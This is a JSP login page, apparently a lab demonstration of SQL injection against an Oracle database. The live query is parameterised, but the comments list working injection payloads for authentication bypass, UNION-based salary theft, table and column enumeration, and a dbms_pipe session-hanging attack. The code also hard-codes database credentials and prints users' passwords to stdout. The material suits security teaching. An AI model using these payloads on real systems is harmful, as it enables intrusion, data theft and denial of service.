<%@ page import="java.sql.*"%>
<%
    String userName = request.getParameter("userName");
    String password = request.getParameter("password");
    Class.forName("oracle.jdbc.driver.OracleDriver");
    Connection conn = DriverManager.getConnection(
                    "jdbc:oracle:thin:@//localhost:1521/orcl", "Navitaniuc", "bilgisayar");



// SELECT user_id FROM LOGINS WHERE loxin = 'X' and buzzword = 'Y'



    /*Statement st = conn.createStatement();
    ResultSet rs;
    rs = st.executeQuery("SELECT loxin FROM LOGINS WHERE loxin = '"+userName+"' and buzzword = '"+password+"'");*/

    PreparedStatement ps = conn.prepareStatement("SELECT loxin FROM LOGINS WHERE loxin =? and buzzword =?");

    ps.setString(1,userName);
    ps.setString(2,password);

    ResultSet rs = ps.executeQuery();


    System.out.println("------------------------------------------------");
    System.out.println("SELECT user_id FROM LOGINS WHERE loxin = '"+userName+"' and buzzword = '"+password+"'");
    //select user_id from logins where loxin='X' AND buzzword = 'Y'
    // SELECT user_id FROM LOGINS WHERE loxin = '[' UNION SELECT salary FROM salaries WHERE user_id=2 --]' and buzzword = 'Y'



    //EXAMPLES OF INPUTS AND THEIR RESULTS
// SELECT user_id FROM LOGINS WHERE loxin = 'X' and buzzword = 'Y'

    //simple substitution to bypass password check
    //superUser' --
    //select user_id from logins where loxin='superUser' --' AND buzzword = 'Y'

    // SELECT FROM ANOTHER TABLE
    //' UNION SELECT TO_CHAR(salary) FROM salaries WHERE user_id=2 --
    // SELECT user_id FROM LOGINS WHERE loxin = '' UNION SELECT TO_CHAR(salary) FROM salaries WHERE user_id=2 --' and buzzword = ''

    //GET FIRST TABLE ACCESSIBLE FOR MISUSE
    //' union SELECT table_name AS loxin FROM user_tables WHERE ROWNUM <= 1 --
    //select loxin from logins where loxin='' union SELECT table_name AS loxin FROM user_tables WHERE ROWNUM <= 1 --' AND buzzword = 'Y'

    //NEXT TABLE ACCESSIBLE FOR MISUSE
    //' union SELECT table_name AS loxin FROM user_tables WHERE table_name NOT IN('SALARIES',) AND ROWNUM <= 1 --
    //select loxin from logins where loxin='[' union SELECT table_name AS loxin FROM user_tables WHERE table_name NOT IN('SALARIES') AND ROWNUM <= 1 --' AND buzzword = 'Y'
    //IN SIMILAR MANNER WE CAN OBTAIN ALL THE TABLES


    //OBTAIN COLUMNS OF ACCESSIBLE TABLES
    //' union select column_name from ALL_TAB_COLUMNS where table_name='SALARIES' AND ROWNUM <= 1--
    // select loxin from logins where loxin='' union select column_name from ALL_TAB_COLUMNS where table_name='SALARIES' AND ROWNUM <= 1--'AND buzzword = 'Y'

    // FIND ANOTHER COLUMN' union select column_name from ALL_TAB_COLUMNS where table_name='SALARIES'AND COLUMN_NAME NOT IN('SALARY') AND ROWNUM <= 1--
    // select loxin from logins where loxin='' union select column_name from ALL_TAB_COLUMNS where table_name='SALARIES'AND COLUMN_NAME NOT IN('SALARY') AND ROWNUM <= 1--'AND buzzword = 'Y'

    // (bolishego vsio ravno ne dobiemsia)' union select column_name from ALL_TAB_COLUMNS where table_name='SALARIES'AND COLUMN_NAME NOT IN('SALARY','USER_ID') AND ROWNUM <= 1--
    // (DOS)select loxin from logins where loxin='' union select column_name from ALL_TAB_COLUMNS where table_name='SALARIES'AND COLUMN_NAME NOT IN('SALARY', 'USER_ID') AND ROWNUM <= 1--'AND buzzword = 'Y'
    //SYSTEM OVERUSE
    //' UNION SELECT CASE WHEN (2>1) THEN 'a' || dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--

/*
(friz_current session)SELECT CASE WHEN (2>1) THEN 'a' || dbms_pipe.receive_message(('a'),3) ELSE NULL END FROM dual;
(cursed login)' UNION SELECT CASE WHEN (2>1) THEN 'a' || dbms_pipe.receive_message(('a'),30) ELSE NULL END FROM dual--
(how we can check there are several hanging sessions)SELECT username FROM v$session WHERE username IS NOT NULL AND STATUS = 'ACTIVE' ORDER BY username AS C;




*/

        // select column_name from ALL_TAB_COLUMNS where table_name='SALARIES' AND COLUMN_NAME NOT IN('SALARY','USER_ID') AND ROWNUM <= 1;





    //' UNION SELECT salary FROM salaries WHERE user_id=2 -- |
    //' union SELECT table_name AS user_id FROM user_tables WHERE table_name NOT IN('') AND ROWNUM <= 1 -- |
    //' union SELECT table_name AS user_id FROM user_tables WHERE table_name NOT IN('NAVITON','PUBLISHERS') AND ROWNUM <= 1; -- |
    if (rs.next()) {
        session.setAttribute("userName", rs.getString("loxin"));
        response.sendRedirect("success.jsp");
        System.out.println("found");
    } else {
        out.println("Invalid password <a href='index.jsp'>try again</a>");
        System.out.println("failed");
    }
%>